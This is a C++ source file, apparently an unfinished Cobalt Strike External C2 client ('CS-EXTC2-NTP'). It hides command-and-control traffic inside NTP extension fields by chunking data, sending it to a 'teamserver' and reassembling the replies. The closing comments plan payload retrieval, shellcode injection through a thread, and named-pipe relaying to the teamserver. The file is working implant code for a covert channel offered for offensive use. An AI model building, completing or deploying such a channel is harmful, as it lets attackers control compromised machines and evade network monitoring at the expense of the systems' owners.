/*

CS-EXTC2-NTP

*/
#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"
#include "helpers.hpp"
#include "net.hpp"
#include <vector>

std::vector<uint8_t> size_tToBytes(size_t value) {
	std::vector<uint8_t> bytes(sizeof(size_t));
	std::memcpy(bytes.data(), &value, sizeof(size_t));
	return bytes;
}

std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField) {
	std::cout << "======================" << std::endl;
	std::cout << "Started Chunking		" << std::endl;
	std::cout << "======================" << std::endl;
	//packetDebugger(data);
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
	std::vector<uint8_t> responseDataBuffer = {};
	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder

	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;

	/*
	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes. 
	*/
	auto packetToNotifyServerOfSize = NTPPacket();
	auto incomingSize = size_tToBytes(dataSize);
	packetToNotifyServerOfSize.addExtensionField(
		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
		incomingSize
	);
	std::cout << "[?] Sending size packet " << std::endl;
	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
	
	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Chunk::maxChunkSize, dataSize); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)

		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);

		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
		//printHexVector(chunkData);

		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			extensionField, //NtpExtensionField::giveMePayload,
			chunkData
		);

		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();

		//Print that we're sending a packet, adn what type of packet it is.
		std::cout << "----------------------" << std::endl;
		std::cout << "Sending NTP Packet [" << i+1 << "/" << amountOfChunks << "]" << std::endl;
		std::cout << "----------------------" << std::endl;
		//run the debugger directly on the incoming respnose packet
		packetDebugger(packet_bytes);
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Print that we've received  a packet, and then print debug items below it
		std::cout << "----------------------" << std::endl;
		std::cout << "Recieved Response Packet" << std::endl;
		std::cout << "----------------------" << std::endl;
		//run the debugger directly on the incoming respnose packet
		packetDebugger(response);

		//Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser packetParser = NTPPacketParser(response);
		//Get extension data:
		std::vector<uint8_t> extensionData = packetParser.getExtensionData();

		//take extracted extension data, put into buffer
		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer

	}
	//print full response data
	std::cout << "[?] Full Data from Responses: ";
	printHexVector(responseDataBuffer);

	std::cout << "[?] chunking process complete: --------------------" << std::endl;

	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}


int main() {
	//Stuff here

	std::cout << "Started" << std::endl;

	//Create pcaket
	auto packet = NTPPacket();
	//packet.printPacket();

	std::vector<uint8_t> packetData = {0xDE,0xAD,0xBE,0xEF};
	packet.addExtensionField(
		NtpExtensionField::giveMePayload,
		packetData
	);

	//parse the created packet (testing parser)
	std::vector < uint8_t> packet_bytes = packet.getPacket();
	NTPPacketParser packetParser = NTPPacketParser(packet_bytes);
	std::vector<uint8_t> extensionData = packetParser.getExtensionData();

	chunker(packet_bytes, NtpExtensionField::dataForTeamserver);

}


//Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend

//void logic() {

	//! Need a dedicated chunking function, that does the chunking logic,and just easily returns the response fromthe server

	//3 seperate functions of how to do this now:

	//GetPayload function(){};
	//Create payload packet (giveMePayload)

	//Send giveMePayload packet
		// > Get size of payload from sizePacket
		// > iterate over payload chunks until data = what was in size packet


	//InjectPayload function();
	//Injection method for running shellcode, go with basic injection method, with a thread.

	//ReadPipe Function();
	//attempt to read pipe
		//	
		//send data to teamserver: sendDataToTeamServer
		//recieve data from teamserver with getDataFromTeamserver, in response

	//attempt to write to pipe
	//goto attempt to read pipe
//}

/*
Next steps:

// Standard data transfer

Figure out chunking. Might be best to one func this, or class it. OneFunc may be easier short term 
 - Initial packet to say overall size (maybe extensionField of 0x51 0x33) //bad SIZE rep in hex: 0x51 0x23

 - After initial packet, wait for next packet, which will be first in data packets. Math can be done for how many packets to expect

 - After packets are done, return completed buffer (in a vector). That can get passed to whatever it needs to


 // Payload Retrieval

Uses the same exact chunker as above, BUT, uses adiff header. Maybe '0x10 0xAD' for (pay)load

Then call injection logic to run payload.

*/